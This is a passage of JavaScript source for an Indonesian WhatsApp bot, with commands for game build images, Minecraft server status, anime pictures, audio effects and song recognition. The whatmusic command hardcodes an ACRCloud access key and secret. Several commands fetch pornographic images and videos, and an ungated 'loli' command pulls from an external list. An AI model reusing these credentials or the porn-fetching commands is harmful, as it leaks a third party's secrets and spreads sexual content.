                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Jean_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'kazuha') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kaedehara Kazuha_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'kaeya') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kaeya_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kaeya_Sub DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'ayaka') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kamisato Ayaka_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'hutao') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Hu Tao_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'ayato') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kamisato Ayato_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'kaveh') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kaveh_Driver.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'keqing') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Keqing_Aggravate.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Keqing_Electro_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'kirara') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kirara_Shielder.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'klee') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Klee_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'kokomi') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kokomi_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'kujosara') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kujo Sara_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'kuki') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Kuki Shinobu_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'layla') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Layla_Shielder.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'lisa') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Lisa_Aggravate.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'mika') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Mika_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'mona') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Mona_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Mona_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'nahida') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Nahida_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'nilou') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Nilou_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'ningguang') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Ningguang_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'noelle') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Noelle_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'qiqi') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Qiqi_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'raiden') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Raiden Shogun_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'razor') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Razor_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'rosaria') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Rosaria_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Rosaria_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'sayu') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Sayu_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'shenhe') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Shenhe_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'heizou') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Shikanoin Heizou_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'sucrose') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Sucrose_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'childe') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Tartaglia_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'thoma') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Thoma_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'tighnari') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Tighnari_Driver.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'mc') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Traveler_Anemo_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Traveler_Dendro_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Traveler_Electro_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Traveler_Geo_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image: { url: `https://raw.githubusercontent.com/FortOfFans/FortOfFans.github.io/main/sheets/Traveler_Hydro_Sub%20DPS.jpg` }, caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'venti') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Venti_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'wanderer') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Wanderer_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'xiangling') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Xiangling_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Xiangling_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'xiao') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Xiao_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'xingqiu') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Xingqiu_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'xingyan') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Xinyan_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'yaemiko') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Yae Miko_Aggravate.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Yae Miko_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'yanfei') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Yanfei_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'yaoyao') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Yaoyao_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'yelan') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Yelan_Sub DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'yoimiya') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Yoimiya_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'yunjin') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Yun Jin_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'zhongli') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Zhongli_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Zhongli_Shielder.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
               } else if (args[0] === 'lyney') {
                    qyuunee.sendMessage(m.chat, { image: { url: `https://raw.githubusercontent.com/FortOfFans/FortOfFans.github.io/main/sheets/Lyney_Main%20DPS.jpg` }, caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
} else if (args[0] === 'lynette') {
                    qyuunee.sendMessage(m.chat, { image: { url: `https://raw.githubusercontent.com/FortOfFans/FortOfFans.github.io/main/sheets/Lynette_Support.jpg` }, caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'xianyun') {
                    qyuunee.sendMessage(m.chat, { image: { url: `https://raw.githubusercontent.com/FortOfFans/GI/main/sheets/Xianyun_Support.jpg` }, caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'arlecchino') {
                    qyuunee.sendMessage(m.chat, { image: { url: `https://raw.githubusercontent.com/FortOfFans/GI/main/sheets/Arlecchino_Main%20DPS.jpg` }, caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    } else if (args[0] === 'chiori') {
                    qyuunee.sendMessage(m.chat, { image: { url: `https://raw.githubusercontent.com/FortOfFans/GI/main/sheets/Character_Chiori.jpg` }, caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
} else if (args[0] === 'freminet') {
                    qyuunee.sendMessage(m.chat, { image: { url: `https://raw.githubusercontent.com/FortOfFans/FortOfFans.github.io/main/sheets/Freminet_Main%20DPS.jpg` }, caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
            } else if (args[0] === 'list') {
            qyuunee.sendMessage(m.chat, {
                    text:  `▧ 「 *LIST CHARACTER FEMALE* 」\n\n- Aloy\n- Amber\n- Arlecchino\n- Ayaka\n- Barbara\n- Beidou\n- Candace\n- Collei\n- Dehya\n- Diona\n- Dori\n- Eula\n- Faruzan\n- Fischl\n- Ganyu\n- HuTao\n- Jean\n- Keqing\n- Klee\n- Kujou Sara\n- Kokomi\n- Layla\n- Lisa\n- Lynette\n- Mona\n- Nahida\n- Nilou\n- Ningguang\n- Noelle\n- Qiqi\n- Raiden\n- Rosaria\n- KujoSara\n- Sayu\n- Shenhe\n- Shinobu\n- Sucrose\n- Xiangling\n- Xianyun\n- Xinyan\n- YaeMiko\n- Yanfei\n- Yaoyao\n- Yelan\n- Yoimiya\n- YunJin\n\n▧ 「 *LIST CHARACTER MALE* 」\n\n- Albedo\n- Alhaitham\n- Ayato\n- Baizhu\n- Bennett\n- Chongyun\n- Cyno\n- Diluc\n- Freminet\n- Gorou\n- Heizou\n- Itto\n- Kaeya\n- Kaveh\n- Kazuha\n- Lyney\n- Mika\n- Razor\n- Tartaglia\n- Thoma\n- Tighnari\n- Venti\n- Wanderer\n- Xiao\n- Xingqiu\n- Zhongli`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: '▧ 「 PAKE HURUF KECIL SEMUA 」',
                            thumbnailUrl: 'https://telegra.ph/file/f05438817a1d796a9b7e3.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            }
            break

case'wuwa-material': {
    if (!text) {
        return reply(`Example: ${prefix + command} Yinlin

*LIST CHARACTER*

- Aalto
- Baizhi
- Calcharo
- Chixia
- Danjin
- Encore
- Jianxin
- Jiyan
- Lingyang
- Mortefi
- Rover-Havoc
- Rover-Spectro
- Sanhua
- Taoqi
- Verina
- Yangyang
- Yinlin
- Yuanwu
`);
    }

    let Maximus;

    if (text.toLowerCase() === 'sanhua') {
        Maximus = '1102';
    } else if (text.toLowerCase() === 'baizhi') {
        Maximus = '1103';
    } else if (text.toLowerCase() === 'lingyang') {
        Maximus = '1104';
    } else if (text.toLowerCase() === 'chixia') {
        Maximus = '1202';
    } else if (text.toLowerCase() === 'encore') {
        Maximus = '1203';
    } else if (text.toLowerCase() === 'mortefi') {
        Maximus = '1204';
    } else if (text.toLowerCase() === 'calcharo') {
        Maximus = '1301';
    } else if (text.toLowerCase() === 'yinlin') {
        Maximus = '1302';
    } else if (text.toLowerCase() === 'yuanwu') {
        Maximus = '1303';
    } else if (text.toLowerCase() === 'yangyang') {
        Maximus = '1402';
    } else if (text.toLowerCase() === 'aalto') {
        Maximus = '1403';
    } else if (text.toLowerCase() === 'jiyan') {
        Maximus = '1404';
    } else if (text.toLowerCase() === 'jianxin') {
        Maximus = '1405';
    } else if (text.toLowerCase() === 'rover-spectro') {
        Maximus = '1502';
    } else if (text.toLowerCase() === 'verina') {
        Maximus = '1503';
    } else if (text.toLowerCase() === 'taoqi') {
        Maximus = '1601';
    } else if (text.toLowerCase() === 'danjin') {
        Maximus = '1602';
    } else if (text.toLowerCase() === 'rover-havoc') {
        Maximus = '1604';
    } else {
        return reply(`Karakter yang dicari tidak ada atau belum tersedia.

*LIST CHARACTER*

- Aalto
- Baizhi
- Calcharo
- Chixia
- Danjin
- Encore
- Jianxin
- Jiyan
- Lingyang
- Mortefi
- Rover-Havoc
- Rover-Spectro
- Sanhua
- Taoqi
- Verina
- Yangyang
- Yinlin
- Yuanwu`);
    }

    try {
        qyuunee.sendMessage(m.chat, { image: { url: `https://raw.githubusercontent.com/DEViantUA/wuthering-waves-elevation-materials/main/character/${Maximus}.png` }, caption:`*- Wuthering Waves - Sheet*`},{ quoted: m })
    } catch (err) {
        reply('Terjadi kesalahan saat mengambil data gambar. Silakan coba lagi nanti.');
    }
}
break

case 'mc':
            if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
            if (args.length == 0) return reply(`*List Server:*\n\n> java\n> bedrock`)
            if (args[0] === 'bedrock') {
axios.get(`https://api.mcstatus.io/v2/status/bedrock/${args[1]}`).then(({ data }) => {
				var caption = `▧「 *S E R V E R  M I N E C R A F T* 」\n\n`
				caption += ` ‣ *IP* : *${data.host}*\n`
				caption += ` ‣ *PORT* : *${data.port}*\n`
				caption += ` ‣ *IP Address* : *${data.ip_address}*\n\n`
				caption += ` ‣ *Players* : *${data.players.online}/${data.players.max}*\n`
				caption += ` ‣ *Version* : *${data.version.name}*\n\n`
				caption += `▧ *Beli Hosting? Di Owner Aja 😋*\n`
				qyuunee.sendMessage(from , {image: { url: `https://telegra.ph/file/ab906f8d0c00ebcd51cf6.jpg` }, caption: caption },{ quoted: m })
			})
} else if (args[0] === 'java') {
axios.get(`https://api.mcstatus.io/v2/status/java/${args[1]}`).then(({ data }) => {
				var caption = `▧「 *S E R V E R  M I N E C R A F T* 」\n\n`
				caption += ` ‣ *IP* : *${data.host}*\n`
				caption += ` ‣ *PORT* : *${data.port}*\n`
				caption += ` ‣ *IP Address* : *${data.ip_address}*\n\n`
				caption += ` ‣ *Players* : *${data.players.online}/${data.players.max}*\n`
				caption += ` ‣ *Version* : *${data.version.name_clean}*\n\n`
				caption += `▧ *Beli Hosting? Di Owner Aja 😋*\n`
				qyuunee.sendMessage(from , {image: { url: `https://telegra.ph/file/ab906f8d0c00ebcd51cf6.jpg` }, caption: caption },{ quoted: m })
			})
} else {
reply('🚫 ERORR')
}
			break
			
case 'neko':
case 'waifu': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
let res = await fetch(`https://waifu.pics/api/sfw/${command}`)
let json = await res.json()
let cap = `🍂 Done...`
qyuunee.sendMessage(from, {image: { url: json.url },caption:`Walah 😋`},{ quoted:m }).catch(err => {
 return('Error!')
})
}
break

case 'loli':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
let anu = await fetchJson(`https://raw.githubusercontent.com/clicknetcafe/Databasee/main/anime/loli.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                qyuunee.sendMessage(m.chat, { image: { url: result}, caption: (mess.success) }, { quoted: koi }).catch(err => {
 return('Error!')
})
break

case 'ahegao':
			case 'yuri':
			case 'cum':
			case 'ero':
			case 'ass':
			case 'neko2':
			case 'okita':
			case 'umeko':
			case 'panties':
			case 'mihye':
			case 'merial':
			case 'quan':
			case 'nanaqi':
			case 'onlyfans':
			case 'onlyhestia':
			case 'nguyenhuang':
			case 'onlynoname': {
			if (db.data.chats[m.chat].nsfw) {
			if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
			loading()
                let anu = await fetchJson(`https://raw.githubusercontent.com/clicknetcafe/Databasee/main/nsfw/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                qyuunee.sendMessage(m.chat, { image: { url: result}, caption: (mess.success) }, { quoted: koi })
        }}
        break

case "quotesanime": {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
const an1 = JSON.parse(fs.readFileSync("./datakoi/quotesanime.json"))
const r4ndan1 = an1[Math.floor(Math.random() * an1.length)]
const tgt99 = `*QUOTES ANIME RANDOM*

Nama Anime : ${r4ndan1.anime}
Nama Character : ${r4ndan1.character}
Episode : ${r4ndan1.episode}
Quotes : ${r4ndan1.quotes}`
qyuunee.sendMessage(from, { text: tgt99 }, { quoted: koi })
}
break

case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                loading()
                let media = await qyuunee.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return reply(err)
                let buff = fs.readFileSync(ran)
                qyuunee.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                reply(e)
                }
                break

		case 'nhentai': {
                if (db.data.chats[m.chat].nsfw) {
                if (!args[0]) return reply(`Contoh: nhentai ayaka`)
                if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
                let hen = await fetchJson(`https://significant-gabriel-neekoi-cd57962e.koyeb.app/doujin?q=${full_args}`);
                qyuunee.sendMessage(from, { document: { url: hen.url }, fileName: hen.title, mimetype: 'application/pdf'}, {quoted:m})
                }}
                break
		
            case 'hentaivid':
			case 'videobokep': {
			if (db.data.chats[m.chat].nsfw) {
			if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
			loading()
                let anu = await fetchJson(`https://raw.githubusercontent.com/clicknetcafe/Databasee/main/nsfw/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                qyuunee.sendMessage(m.chat, { video: { url: result }, caption: (mess.success) }, { quoted: koi })
        }}
        break

case 'cih': {
if (!m.isGroup) return
  this.cai = this.cai ? this.cai : {};
  const keyword = text.split(" ")[0];
  if (args[0] === "search") {
    if (!args[1]) reply(`*• Example:* ${prefix + command} Hutao`)
    reply(`_🔍searching data.... *[ ${args[1]} ]*_`);
    const cih = await fetchJson(`https://cih-cai-jir.koi.pics/search?q=${args[1]}`);
    const V = cih.characters.slice(0x0, 0x5);
    const karakter = V.map(U => `*[ ${U.participant__name} ]*
*• Greeting:* \`${U.greeting}\`
*• Visibility:* ${U.visibility}
*• Creator:* ${U.user__username}`
      ).join("\n\n");
    const aha = await qyuunee.sendMessage(m.chat, {text: karakter}, {quoted:m})
    await qyuunee.sendMessage(m.chat, {text: `*[ KETIK ANGKA 1 SAMPAI ${cih.characters.length} ]*
> • _! Pilih karakter anda dengan mengetik *.cai set (nomor urut)* sesuai dengan pesan diatas_` + aha }, {quoted:m})
    this.cai[m.sender] = {
      pilih: cih.characters,
    };
  } else if (args[0] === "set") {
    if (!this.cai[m.sender])
      reply(`*[ KAMU BELUM MENCARI CHARACTER ]*
> _ketik *.cai search* untuk mencari characters favorit mu_`);
    if (!this.cai[m.sender].pilih)
      reply(`*[ KAMU SUDAH PUNYA CHARACTER ]*
> _ketik *.cai search* untuk menganti characters_`);
    if (!args[1]) reply(`*• Example:* ${prefix + command} 1`);
    let pilihan = this.cai[m.sender].pilih[args[1] - 1];
    let info = await fetchJson(
      "https://cih-cai-jir.koi.pics/newchat?id=" +
        pilihan.external_id
    );
    let caption = `*[ INFO CHARACTERS NO ${args[1]} ]*
*• Name:* ${pilihan.participant__name}
*• Greeting:* \`${pilihan.greeting}\`
*• Visibily:* ${pilihan.visibility}
*• Description:* ${info.description}`;
    let q = await qyuunee.sendMessage(m.chat, {text: caption}, {quoted:m})
    this.cai[m.sender] = {
      isChats: false,
      id: pilihan.external_id,
      thumb:
        "https://characterai.io/i/200/static/avatars/" +
        pilihan.avatar_file_name,
      name: pilihan.participant__name,
    };
  } else if (args[0] === "on") {
    if (!this.cai[m.sender])
      reply(`*[ KAMU BELUM MENCARI CHARACTER ]*
> _ketik *.cai search* untuk mencari characters favorit mu_`)
    this.cai[m.sender].isChats = true;
    reply("_*[ ✓ ] Room chat berhasil dibuat*_");
  } else if (args[0] === "off") {
    if (!this.cai[m.sender])
      reply(`*[ KAMU BELUM MENCARI CHARACTER ]*
> _ketik *.cai search* untuk mencari characters favorit mu_`);
    this.cai[m.sender].isChats = false;
    reply("_*[ ✓ ] Berhasil keluar dari Room chat*_");
  } else {
  reply(`*• Example:* ${prefix + command} *[on/off]*
*• Example search Chara:* ${prefix + command} search *[characters name]*`)
}

if (budy.startsWith('')) {
  if (!m.text) return;
  if (!this.cai[m.sender]) return;
  if (!this.cai[m.sender].isChats) return;
  const res = await fetchJson("https://cih-cai-jir.koi.pics/cai?char=" + this.cai[m.sender].id +  "&message=" + encodeURIComponent(m.text));
  const U = res.reply;
  qyuunee.sendMessage(m.chat, {text: `*${res.name}*\n> ${U}`}, {quoted:m})
}
}
break

case 'cekasalmember': {
  if (!m.isGroup) return reply(mess.group)
  const participants = await qyuunee.groupMetadata(m.chat).then(metadata => metadata.participants);
  let countIndonesia = 0;
  let countMalaysia = 0;
  let countUSA = 0;
  let countOther = 0;
  
  participants.forEach(participant => {
    const phoneNumber = participant.id.split('@')[0];
    if (phoneNumber.startsWith("62")) {
      countIndonesia++;
    } else if (phoneNumber.startsWith("60")) {
      countMalaysia++;
    } else if (phoneNumber.startsWith("1")) {
      countUSA++;
    } else if (phoneNumber.startsWith("+1")) {
      countOther++;
    } else {
      countOther++;
    }
  });
  
  const replyMessage = `Jumlah Anggota Grup Berdasarkan Negara:\n\nAnggota Indonesia: ${countIndonesia} 🇮🇩\nAnggota Malaysia: ${countMalaysia} 🇲🇾\nAnggota USA + OTHER : ${countUSA} 🇺🇲\nAnggota Negara Lain: ${countOther} 🏳️`;
  reply(replyMessage);
  }
  break
  
case 'whatmusic': {
const fs = require('fs')
const acrcloud = require('acrcloud')

const acr = new acrcloud({
  'host': "identify-eu-west-1.acrcloud.com",
  'access_key': "c33c767d683f78bd17d4bd4991955d81",
  'access_secret': "bvgaIAEtADBTbLwiPGYlxupWqkNGIjT7J9Ag2vIu"
});

  const targetMessage = m.quoted ? m.quoted : m;
  const mimeType = (targetMessage.msg || targetMessage).mimetype || '';

  if (/audio|video/.test(mimeType)) {
    if ((targetMessage.msg || targetMessage).seconds > 0x14) {
      return reply("[ INFORMATION ]\n\nMaksimal 20 detik");
    }

    const fileData = await targetMessage.download();
    const fileType = mimeType.split('/')[1];

    fs.writeFileSync(`./src/${m.sender}.${fileType}`, fileData);

    const acrResult = await acr.identify(fs.readFileSync(`./src/${m.sender}.${fileType}`));

    const { code, msg } = acrResult.status;

    if (code !== 0x0) {
      throw msg;
    }

    const {
      title,
      artists,
      album,
      genres,
      release_date
    } = acrResult.metadata.music[0x0];

    const resultMessage = ("\n\n*≡ HASIL PENCARIAN INFO MUSIK*\n\n┌─⊷ *MUSIK APA?* \n▢ Judul: " + title +
      "\n▢ Artis: " + (artists !== undefined ? artists.map(artist => artist.name).join(", ") : "Tidak ditemukan") +
      "\n▢ Album: " + (album.name || "Tidak ditemukan") +
      " \n▢ Genre: " + (genres !== undefined ? genres.map(genre => genre.name).join(", ") : "Tidak ditemukan") +
      "\n▢ Diliris pada: " + (release_date || "Tidak ditemukan") +
      "\n└──────────────").trim();

    fs.unlinkSync(`./src/${m.sender}.${fileType}`);
    reply(resultMessage);
  } else {
    reply("*[ INFORMATION ] Reply Audio*")
  }
};
break


case 'whatanime': {
	try {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || q.mediaType || "";
    if (!mime.startsWith('image')) {
      return reply("*Respond to an image*");
    }
    let data = await q.download();
    let image = await uploadImage(data);
    let apiUrl = `https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(image)}`;
    console.log("API URL:", apiUrl);
    let response = await fetch(apiUrl);
    let result = await response.json();
    console.log("API Response:", result);
    if (!result || result.error || result.result.length === 0) {
      return reply("*Error: Could not track the anime.*");
    }
